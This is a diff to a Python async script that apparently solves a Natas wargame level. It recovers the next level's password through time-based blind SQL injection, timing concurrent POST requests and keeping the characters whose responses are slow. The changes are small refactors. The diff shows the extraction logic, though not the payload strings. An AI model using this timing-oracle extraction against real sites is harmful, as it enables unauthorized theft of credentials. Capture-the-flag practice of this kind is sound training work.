@@ -17,7 +17,7 @@ async def get_password_request(session, natas18_password, character):
 
     start = time.time()
     async with session.post(URL, data=data) as response:
-        await response
+        await response.text()
         elapsed_time = time.time() - start
 
         return elapsed_time, character
@@ -35,14 +35,11 @@ async def get_password(session, valid_characters):
             tasks.append(asyncio.ensure_future(get_password_request(session, natas18_password, character)))
         requests = await asyncio.gather(*tasks)
 
-        for request in requests:
-            if request[0] >= INJECTION_TIME:
-                """
-                If elapsed time of the request is >= INJECTION_TIME
-                that means that the injection was successfull
-                and request[1] is a valid character
-                """
-                natas18_password += request[1]
+        for response in requests:
+            elapsed_time = response[0]
+            character_injected = response[1]
+            if elapsed_time >= INJECTION_TIME:
+                natas18_password += character_injected
                 spinner.stop()
                 spinner = Halo(text=SPINNER_TEXT + natas18_password,
                                spinner="bouncingBar", color="blue")
@@ -59,7 +56,7 @@ async def get_valid_chars_request(session, character):
 
     start = time.time()
     async with session.post(URL, data=data) as response:
-        await response
+        await response.text()
         elapsed_time = time.time() - start
 
         return elapsed_time, character
@@ -77,14 +74,11 @@ async def get_valid_chars(session):
         tasks.append(asyncio.ensure_future(get_valid_chars_request(session, character)))
     requests = await asyncio.gather(*tasks)
 
-    for request in requests:
-        if request[0] >= INJECTION_TIME:
-            """
-            If elapsed time of the request is >= INJECTION_TIME
-            that means that the injection was successfull,
-            and request[1] is a valid character.
-            """
-            valid_characters += request[1]
+    for response in requests:
+        elapsed_time = response[0]
+        character_injected = response[1]
+        if elapsed_time >= INJECTION_TIME:
+            valid_characters += character_injected
 
     spinner.stop()
 
